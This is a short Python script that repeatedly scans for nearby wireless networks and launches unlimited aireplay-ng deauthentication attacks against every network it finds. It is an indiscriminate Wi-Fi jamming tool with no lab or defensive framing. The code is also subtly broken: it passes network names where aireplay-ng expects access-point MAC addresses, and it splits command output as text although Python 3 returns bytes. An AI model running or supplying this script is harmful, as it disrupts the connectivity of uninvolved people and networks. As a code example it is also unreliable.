import subprocess
import time

while True:
    try:
        output = subprocess.check_output(['iwlist', 'wlan0', 'scan'])
        networks = [line.split(':')[1] for line in output.split('\n') if 'ESSID' in line]
        for network in networks:
            subprocess.call(['aireplay-ng', '-0', '0', '-a', network.strip(), 'wlan0'])
        time.sleep(1)
    except KeyboardInterrupt:
        break
